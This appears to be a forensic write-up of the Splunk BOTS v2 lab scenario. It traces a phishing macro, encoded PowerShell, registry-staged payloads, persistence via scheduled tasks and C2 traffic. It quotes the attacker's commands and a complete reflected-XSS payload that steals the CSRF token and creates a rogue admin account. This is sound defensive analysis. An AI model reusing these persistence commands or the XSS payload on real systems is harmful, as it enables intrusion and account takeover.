@@ -1,0 +1,65 @@
+1. Endpoint Weaponization & Execution Flow (wrk-btun)
+Screenshot Evidence: index=botsv2 host=*btun* (EventCode=4688 OR EventCode=1)
+
+08:58:55 UTC: billy.tun opened the malicious attachment:
+
+Plaintext
+"C:\Program Files (x86)\Microsoft Office\Root\Office16\WINWORD.EXE" /n "C:\Users\billy.tun\AppData\Local\Temp\Temp1_invoice.zip\invoice.doc" /o "u"
+08:59:08 UTC: Word macro spawned an initial obfuscated PowerShell process:
+
+Plaintext
+powershell -NoP -sta -w 1 -enc WwBSAEUARgBdAC4AQ...
+09:02:00 UTC: PowerShell staged execution from the current user registry hive:
+
+PowerShell
+"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -NoP -NonI -c $x=$((gp HKCU:Software\Microsoft\Windows Update).Update); powershell -NoP -NonI -W Hidden -enc $x
+09:15:03 UTC: Persistence established via Scheduled Tasks running as NT AUTHORITY\SYSTEM:
+"C:\Windows\system32\schtasks.exe" /Create /F /RU system /SC DAILY /ST 10:26 /TN Updater /TR "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NonI -W hidden -c \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKLM:\Software\Microsoft\Network debug).debug)))\""
+
+2. Registry Staging & Lateral Movement Across Fleet
+Screenshot Evidence: index="botsv2" source="WinRegistry" "\\Software\\Microsoft\\Network"
+
+The adversary staged fileless Base64 payloads inside HKLM\Software\Microsoft\Network\debug across multiple domain hosts:
+
++---------------------+----------------+----------------+-----------------+----------------------------------------+
+| Timestamp (UTC)     | Host           | Process Image  | Registry Action | Key Path Target                        |
++---------------------+----------------+----------------+-----------------+----------------------------------------+
+| 2017-08-24 09:15:03 | wrk-btun       | powershell.exe | SetValue        | HKLM\software\microsoft\network\debug  |
+| 2017-08-24 09:34:26 | wrk-klagerf    | powershell.exe | SetValue        | HKLM\software\microsoft\network\debug  |
+| 2017-08-24 09:42:36 | venus (Server) | powershell.exe | SetValue        | HKLM\software\microsoft\network\debug  |
+| 2017-08-24 09:50:24 | mercury        | powershell.exe | SetValue        | HKLM\software\microsoft\network\debug  |
++---------------------+----------------+----------------+-----------------+----------------------------------------+
+
+Domain Controller / Server Persistence (venus):
+Event: EventCode 4688 / TaskScheduler
+User Context: FROTHLY\service3 (Logon ID: 0x171491A)
+Execution Command:
+
+"C:\Windows\system32\schtasks.exe" /Create /F /RU system /SC DAILY /ST 10:51 /TN Updater /TR "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NonI -W hidden -c \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKLM:\Software\Microsoft\Network debug).debug)))\""
+
+3. Web Exploitation & Client-Side Anti-CSRF Token Bypass
+Screenshot Evidence: Sysmon Event ID 1 & Stream Telemetry
+Pre-Attack Cookie Leakage: Workstation wrk-klagerf (10.0.2.109) leaked MyBB session cookies (mybb[lastvisit], mybb[lastactive]) to attacker port 45.77.65.211:9999.
+Phishing Execution: Chrome launched on wrk-klagerf under user frothly\kevin.lagerfield processing the reflected XSS payload:
+
+[http://www.brewertalk.com/admin/index.php?module=user-titles&action=edit&utid=2](http://www.brewertalk.com/admin/index.php?module=user-titles&action=edit&utid=2)"><script>
+window.onload=function(e){
+  var my_post_key = document.getElementsByName("my_post_key")[0].value;
+  var postdata = "my_post_key=" + my_post_key + "&username=kIagerfield&password=beer_lulz&confirm_password=beer_lulz&email=kIagerfield@froth.ly&usergroup=4&additionalgroups[]=4&displaygroup=4";
+  var url = "[http://www.brewertalk.com/admin/index.php?module=user-users&action=add](http://www.brewertalk.com/admin/index.php?module=user-users&action=add)";
+  var http = new XMLHttpRequest();
+  http.open("POST", url);
+  http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+  http.send(postdata);
+}
+</script>
+
+Impact: Anti-CSRF token (my_post_key) extracted directly from the DOM; browser coerced into provisioning rogue administrative account kIagerfield (usergroup=4).
+
+4. Network C2 & IDS Signatures
+Screenshot Evidence: index=botsv2 dest_ip="45.77.65.211" sourcetype="suricata"
+Suricata network IDS telemetry captured continuous non-compliant SSL/TLS communication destined for C2 server 45.77.65.211:443:
+SURICATA TLS invalid handshake message (Port 443)
+SURICATA TLS invalid record/traffic (Port 443)
+
+Analysis: Threat actor encapsulated a custom binary command-and-control protocol inside standard TCP port 443 to bypass perimeter firewall egress restrictions.
